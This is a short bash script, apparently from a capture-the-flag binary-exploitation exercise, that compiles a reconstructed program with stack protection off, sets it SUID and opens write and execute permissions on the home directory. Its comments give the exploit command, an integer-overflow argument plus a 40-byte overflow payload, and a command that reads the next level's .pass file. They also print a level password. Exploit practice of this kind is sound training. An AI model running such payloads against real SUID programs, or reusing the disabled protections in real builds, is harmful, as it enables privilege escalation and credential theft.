#!/bin/bash
# This script will allow to test the pseudo code in source.c file by copy it in the folder /tmp in the VM

# -------------------------------- PREREQUIRES -------------------------------- #
#                            From your local machine                            #
#       Copy the source and the script files in the tmp folder in your VM       #
#                  scp -P 4242 path/source.c bonus2@VM_IP:/tmp                  #
#                  scp -P 4242 path/script.sh bonus2@VM_IP:/tmp                 #
#                                                                               #
#     pwd: 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245     #
#                                                                               #
#                                                                               #
#                                                                               #
#                   Don't forget to run it ;) bash script.sh                    #
# ----------------------------------------------------------------------------- #

# Compile the program
gcc -fno-stack-protector source.c -o ft_bonus1
# -fno-stack-protector : https://stackoverflow.com/questions/1345670/stack-smashing-detected

# Set SUID to give root user permissions
chmod u+s ft_bonus1

# Add write and execution permissions on home directory
chmod +wx ~

# Move the program to home directory
mv ft_bonus1 ~


# Then you have to run the program and cat .pass as bonus1 by taping manually these commands

#	su bonus1
#	/home/user/bonus2/ft_bonus1 -2147483637 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
#	cat /home/user/bonus2/.pass
